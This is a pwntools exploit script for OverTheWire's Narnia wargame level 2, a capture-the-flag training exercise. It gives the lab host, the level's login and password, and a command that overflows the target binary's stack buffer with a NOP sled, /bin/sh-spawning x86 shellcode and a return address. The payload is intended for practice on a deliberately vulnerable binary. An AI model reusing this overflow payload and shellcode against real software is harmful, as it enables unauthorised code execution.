from pwn import *

host = "narnia.labs.overthewire.org"
user = "narnia2"
password = "nairiepecu"
binary = "/games/narnia/narnia2"

# /games/narnia/narnia2 `python -c "print '9090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090906a68682f2f2f73682f62696e6a0b5889e331c999cd8090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090d0d5ffff'.decode('hex')"`